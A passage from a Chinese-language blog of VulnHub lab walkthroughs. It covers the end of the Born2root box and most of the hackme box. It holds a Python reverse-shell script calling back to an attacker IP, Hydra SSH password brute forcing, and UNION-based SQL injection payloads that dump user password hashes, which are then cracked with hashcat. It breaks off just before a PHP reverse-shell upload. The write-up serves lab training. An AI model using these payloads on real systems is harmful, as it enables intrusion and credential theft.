class="hljs-keyword">import</span> call<br><span class="hljs-keyword">import</span> socket<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;192.168.56.106&quot;</span>,<span class="hljs-number">443</span>)) <br>dup2(s.fileno(),<span class="hljs-number">0</span>) <br>dup2(s.fileno(),<span class="hljs-number">1</span>) <br>dup2(s.fileno(),<span class="hljs-number">2</span>) <br>call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@debian:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br>/bin/sh<br>jimmy@debian:~$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>jimmy@debian:~$ <span class="hljs-built_in">export</span><br><span class="hljs-built_in">export</span><br><span class="hljs-built_in">declare</span> -x HOME=<span class="hljs-string">&quot;/home/jimmy&quot;</span><br><span class="hljs-built_in">declare</span> -x LANG=<span class="hljs-string">&quot;fr_FR.UTF-8&quot;</span><br><span class="hljs-built_in">declare</span> -x LOGNAME=<span class="hljs-string">&quot;jimmy&quot;</span><br><span class="hljs-built_in">declare</span> -x LS_COLORS=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">declare</span> -x OLDPWD<br><span class="hljs-built_in">declare</span> -x PATH=<span class="hljs-string">&quot;.:/home/jimmy:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&quot;</span><br><span class="hljs-built_in">declare</span> -x PWD=<span class="hljs-string">&quot;/home/jimmy&quot;</span><br><span class="hljs-built_in">declare</span> -x SHELL=<span class="hljs-string">&quot;/bin/sh&quot;</span><br><span class="hljs-built_in">declare</span> -x SHLVL=<span class="hljs-string">&quot;1&quot;</span><br></code></pre></td></tr></table></figure><p>成功写入了 PATH 之中，尝试将偷天换日</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@debian:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt;<span class="hljs-built_in">echo</span>    <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt;<span class="hljs-built_in">echo</span><br>jimmy@debian:~$ <span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">echo</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">echo</span><br></code></pre></td></tr></table></figure><p>不过搞完发现并没有成功，看起来 echo 命令似乎并不受环境变量的影响。</p><p><img src="/pic/b464495be96112fd829e5aff215607b2_MD5.png"></p><p>好吧，确实忘了内建命令这件事，接下来又尝试了 SUID、信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@debian:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br> 20871   96 -rwsr-xr-x   1 root     root        96760 août 13  2014 /sbin/mount.nfs<br>  3589   28 -rwsr-xr-x   1 root     root        26344 mars 30  2015 /bin/umount<br>  3588   36 -rwsr-xr-x   1 root     root        34684 mars 30  2015 /bin/mount<br> 13038   40 -rwsr-xr-x   1 root     root        38868 févr. 24  2017 /bin/su<br>141996    8 -rwsrwxrwx   1 root     root         7496 juin  9  2017 /home/jimmy/networker<br> 20118 1060 -rwsr-xr-x   1 root     root      1085300 janv.  7  2017 /usr/sbin/exim4<br> 20945   96 -rwsr-sr-x   1 root     mail        96192 févr. 11  2015 /usr/bin/procmail<br> 11741   44 -rwsr-xr-x   1 root     root        43576 févr. 24  2017 /usr/bin/chsh<br> 11740   52 -rwsr-xr-x   1 root     root        52344 févr. 24  2017 /usr/bin/chfn<br> 11743   80 -rwsr-xr-x   1 root     root        78072 févr. 24  2017 /usr/bin/gpasswd<br> 11744   52 -rwsr-xr-x   1 root     root        53112 févr. 24  2017 /usr/bin/passwd<br> 19869   52 -rwsr-sr-x   1 daemon   daemon      50644 sept. 30  2014 /usr/bin/at<br> 13045   40 -rwsr-xr-x   1 root     root        38740 févr. 24  2017 /usr/bin/newgrp<br> 20914  552 -rwsr-xr-x   1 root     root       562536 juil. 22  2016 /usr/lib/openssh/ssh-keysign<br> 20200  356 -rwsr-xr--   1 root     messagebus   362672 nov. 22  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>  2048   12 -rwsr-xr-x   1 root     root         9468 mars 28  2017 /usr/lib/eject/dmcrypt-get-device<br></code></pre></td></tr></table></figure><p>不过都失败了。有点郁闷，使用 linpeas 来辅助收集信息吧，但却发现 wget, curl,gcc 等命令都被限制了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@debian:~$ wget<br>wget<br> HAHA ... Nope<br></code></pre></td></tr></table></figure><p>不像是 rbash ，可能是作者对某些系统调用进行了 hook </p><p>只好使用 scp 上传文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ scp -o PubkeyAcceptedKeyTypes=ssh-rsa -i privatekey /home/kali/tools/internal\ information/linpeas.sh martin@192.168.56.135:/tmp<br>linpeas.sh<br></code></pre></td></tr></table></figure><p>但是 linpeas 中看了一圈也没找到什么思路，加上 gcc 又无法使用，黔驴技穷了。</p><h2 id="ssh-密码爆破"><a href="#ssh-密码爆破" class="headerlink" title="ssh 密码爆破"></a>ssh 密码爆破</h2><p>看了看 WP，没想到是如此的简单粗暴（因为有切换用户的操作，我一直觉得新获得的用户在某些方面有特殊权限或者能读取特殊文件，但没想到直接爆破了）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ <span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep hadi &gt;hadipasswd<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo hydra -l hadi -P hadipasswd 192.168.56.135 ssh <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-19 12:30:49<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 1581 login tries (l:1/p:1581), ~99 tries per task<br>[DATA] attacking ssh://192.168.56.135:22/<br>[STATUS] 166.00 tries/min, 166 tries <span class="hljs-keyword">in</span> 00:01h, 1416 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:09h, 15 active<br>[22][ssh] host: 192.168.56.135   login: hadi   password: hadi123<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 3 final worker threads did not complete <span class="hljs-keyword">until</span> end.<br>[ERROR] 3 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-19 12:32:27<br></code></pre></td></tr></table></figure><p>不过也学了一手，爆破使用的密码是从 rockyou.txt 中取用的和用户名有相同部分的密码，此外还可以使用 <code>cupp -i</code> 命令来根据用户信息生成字典。</p><h2 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h2><p>最后尝试使用这个密码来 su 切换到 root 用户，成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">hadi@debian:/home$ su<br>Mot de passe : <br>root@debian:/home<span class="hljs-comment"># cd /root</span><br>root@debian:~<span class="hljs-comment"># ls</span><br>flag.txt<br>root@debian:~<span class="hljs-comment"># cat flag.txt </span><br>                                                                      <br>,-----.                         ,---. ,------.                 ,--.   <br>|  |) /_  ,---. ,--.--.,--,--, <span class="hljs-string">&#x27;.-.  \|  .--. &#x27;</span> ,---.  ,---. ,-<span class="hljs-string">&#x27;  &#x27;</span>-. <br>|  .-.  \| .-. ||  .--<span class="hljs-string">&#x27;|      \ .-&#x27;</span> .<span class="hljs-string">&#x27;|  &#x27;</span>--<span class="hljs-string">&#x27;.&#x27;</span>| .-. || .-. |<span class="hljs-string">&#x27;-.  .-&#x27;</span> <br>|  <span class="hljs-string">&#x27;--&#x27;</span> /<span class="hljs-string">&#x27; &#x27;</span>-<span class="hljs-string">&#x27; &#x27;</span>|  |   |  ||  |/   <span class="hljs-string">&#x27;-.|  |\  \ &#x27;</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;  |  |   </span><br><span class="hljs-string">`------&#x27;</span>  `---<span class="hljs-string">&#x27; `--&#x27;</span>   `--<span class="hljs-string">&#x27;&#x27;</span>--<span class="hljs-string">&#x27;&#x27;</span>-----<span class="hljs-string">&#x27;`--&#x27;</span> <span class="hljs-string">&#x27;--&#x27;</span> `---<span class="hljs-string">&#x27;  `---&#x27;</span>   `--<span class="hljs-string">&#x27;   </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Congratulations ! you  pwned completly Born2root&#x27;</span>s CTF .<br><br>I hope you enjoyed it and you have made Tea<span class="hljs-string">&#x27;s overdose or coffee&#x27;</span>s overdose :p <br><br>I have blocked some easy ways to complete the CTF ( Kernel Exploit ... ) <span class="hljs-keyword">for</span> give you more fun and more knownledge ...<br><br>Pwning the box with a linux binary misconfiguration is more fun than with a Kernel Exploit !<br><br>Enumeration is The Key .<br><br><br><br>Give me feedback :[FB] Hadi Mene<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hackme 靶机</title>
    <link href="/2023/08/6a3fef14f8e4.html"/>
    <url>/2023/08/6a3fef14f8e4.html</url>
    
    <content type="html"><![CDATA[<h1 id="hackme-靶机"><a href="#hackme-靶机" class="headerlink" title="hackme 靶机"></a>hackme 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/hackme]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.143 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 17:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.143<br>Host is up (0.00012s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:4F:34:38 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.71 seconds<br></code></pre></td></tr></table></figure><p>开放了 22 和 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/hackme]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.1.1.143                                   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 17:03 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.143<br>Host is up (0.00034s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)<br>|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)<br>|_  256 32:76:90:b8:7d:<span class="hljs-built_in">fc</span>:a4:32:63:10:<span class="hljs-built_in">cd</span>:67:61:49:d6:c4 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.34 (Ubuntu)</span><br><span class="hljs-string">MAC Address: 00:0C:29:4F:34:38 (VMware)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 3.X|4.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-string">OS details: Linux 3.2 - 4.9</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds</span><br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统，以防万一看看 UDP 端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/hackme]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.143   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 19:00 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.143<br>Host is up (0.00038s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:4F:34:38 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.57 seconds<br></code></pre></td></tr></table></figure><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>访问 80 端口，自动跳转到登录界面，同时进行目录爆破</p><p><img src="/pic/48fb6deea5583a2d4b8dfa9ec0fcfd16_MD5.png"></p><p>感觉有点简陋，在这个界面试一试 SQL 注入（万能密码），但是失败了。</p><p>看到可以注册，尝试注册后登录</p><p><img src="/pic/48fb6deea5583a2d4b8dfa9ec0fcfd16_MD5.png"></p><p>注册后登录成功，来到了 welcome.php</p><p><img src="/pic/3ff0023cc3f3632031a9831ac97e531d_MD5.png"></p><p>目录爆破也出了结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/hackme]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.143<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              php<br>[+] Timeout:                 10s<br>===============================================================<br>2023/08/15 18:59:40 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 200) [Size: 100]<br>/.php                 (Status: 403) [Size: 290]<br>/login.php            (Status: 200) [Size: 1245]<br>/register.php         (Status: 200) [Size: 1937]<br>/uploads              (Status: 301) [Size: 312] [--&gt; http://192.1.1.143/uploads/]<br>/welcome.php          (Status: 302) [Size: 0] [--&gt; login.php]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]<br>/config.php           (Status: 200) [Size: 0]<br>/.php                 (Status: 403) [Size: 290]<br>/server-status        (Status: 403) [Size: 299]<br>Progress: 436644 / 441122 (98.98%)<br>===============================================================<br>2023/08/15 19:00:25 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>看来下 uploads 目录，没有上传文件的路口。</p><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>继续看看刚才界面的搜索框，使用 burp suite 抓包后使用 fuzz 字典进行爆破</p><p><img src="/pic/a6670dfa2d3350b6482a7757593d83be_MD5.png"></p><p>看到似乎是有注入点的，开始手动注入</p><p>构造</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">&#123;<span class="hljs-keyword">base&#125;&#x27; </span><span class="hljs-keyword">or </span><span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><p><img src="/pic/d17f1b4352e58a149e27125fcab4cfdc_MD5.png"></p><p>可以看到这时候显示了所有的信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">&#123;base&#125;&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">#</span><br><br>&#123;base&#125;&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>当 order by 4 的时候无回显，order by 3 的时候显示全部信息</p><p>构造</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#123;base&#125;&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/pic/b7301e9288944ecbf027ed53c32da20c_MD5.png"></p><p>发现 1,2,3 都是回显位</p><p><img src="/pic/94d35494e595e146cc66c8865c85bcc9_MD5.png"></p><p>接下来继续经典操作，MySQL 注入</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">&#123;base&#125;&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> group_concat(table_name),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema = &#x27;webapphacking&#x27; #<br></code></pre></td></tr></table></figure><p><img src="/pic/00822fe5d886ad6063ff4dac5d06d6dc_MD5.png"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#123;base&#125;&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">group_concat</span>(column_name),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> from information_schema.columns <span class="hljs-built_in">where</span> table_name = &#x27;users&#x27; <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/pic/2f676e15432da2fe5a021844c96d3ed7_MD5.png"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;base&#125;&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select group<span class="hljs-constructor">_concat(<span class="hljs-params">id</span>,0x2d,<span class="hljs-params">user</span>,0x2d,<span class="hljs-params">pasword</span>,0x2d,<span class="hljs-params">name</span>,0x2d,<span class="hljs-params">address</span>)</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> from users #<br></code></pre></td></tr></table></figure><p><img src="/pic/f8d12955eddd022ead7bbae9a835cf5c_MD5.png"></p><p>将结果拿出来，稍微规整一下，写入到 result 文件中，记得去除掉我们注册的 jack 用户</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>-user1-<span class="hljs-number">5</span>d41402abc4b2a76b9719d911017c592-David-Newton Circles,<br><span class="hljs-attribute">2</span>-user2-<span class="hljs-number">6269</span>c4f71a55b24bad0f0267d9be5508-Beckham-Kensington,<br><span class="hljs-attribute">3</span>-user3-<span class="hljs-number">0</span>f359740bd1cda994f8b55330c86d845-anonymous-anonymous,<span class="hljs-number">10</span>-test-<span class="hljs-number">05</span>a671c66aefea124cc08b76ea6d30bb-testismyname-testaddress,<br><span class="hljs-attribute">11</span>-superadmin-<span class="hljs-number">2386</span>acb2cf356944177746fc92523983-superadmin-superadmin,<br><span class="hljs-attribute">12</span>-test1-<span class="hljs-number">05</span>a671c66aefea124cc08b76ea6d30bb-test1-test1,<br><span class="hljs-attribute">13</span>-jack-e10adc3949ba59abbe56e057f20f883e-jack-jack<br></code></pre></td></tr></table></figure><h2 id="密码哈希碰撞"><a href="#密码哈希碰撞" class="headerlink" title="密码哈希碰撞"></a>密码哈希碰撞</h2><p>到了最喜欢的使用 awk 的环节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk -F <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> result &gt; passwdhash<br></code></pre></td></tr></table></figure><p>接下来用 hashcat</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">hashcat -m <span class="hljs-number">0</span> -a <span class="hljs-number">0</span> userpasswdhash --show rockyou.txt<br><span class="hljs-number">5</span>d<span class="hljs-number">41402</span>abc<span class="hljs-number">4</span>b<span class="hljs-number">2</span>a<span class="hljs-number">76</span>b<span class="hljs-number">9719</span>d<span class="hljs-number">911017</span><span class="hljs-keyword">c</span><span class="hljs-number">592</span>:hello<br><span class="hljs-number">6269</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>f<span class="hljs-number">71</span>a<span class="hljs-number">55</span>b<span class="hljs-number">24</span>bad<span class="hljs-number">0</span>f<span class="hljs-number">0267</span>d<span class="hljs-number">9</span>be<span class="hljs-number">5508</span>:commando<br><span class="hljs-number">0</span>f<span class="hljs-number">359740</span>bd<span class="hljs-number">1</span>cda<span class="hljs-number">994</span>f<span class="hljs-number">8</span>b<span class="hljs-number">55330</span><span class="hljs-keyword">c</span><span class="hljs-number">86</span>d<span class="hljs-number">845</span>:p<span class="hljs-title">@ssw0rd</span><br><span class="hljs-number">05</span>a<span class="hljs-number">671</span><span class="hljs-keyword">c</span><span class="hljs-number">66</span>aefea<span class="hljs-number">124</span><span class="hljs-keyword">cc</span><span class="hljs-number">08</span>b<span class="hljs-number">76</span>ea<span class="hljs-number">6</span>d<span class="hljs-number">30</span>bb:testtest<br></code></pre></td></tr></table></figure><p>不得不说 hashcat 是真的快，不过有个似乎有个密码没被碰撞出来，看一眼竟然是 superadmin 没被爆破出来，那只能试试在线网站试试运气了</p><p><img src="/pic/dbedaa7cab6d8e5e4d52ffab8c6e6c2c_MD5.png"></p><p>完美，现在拿到了一堆密码和用户名，可以尝试进行 ssh 爆破</p><p>不过既然是网站的用户名和密码，我们可以在爆破的同时去网站登陆一下 superadmin 用户</p><p><img src="/pic/a24db7385a6a22fac8347a6bb59a0aec_MD5.png"></p><p>竟然可以上传文件，结合目录爆破中有个 upload 目录，那么我们可以猜测攻击路径或许是先上传反弹 shell 的文件，再从浏览器中访问进而 getshell</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>直接传个经典 php 的 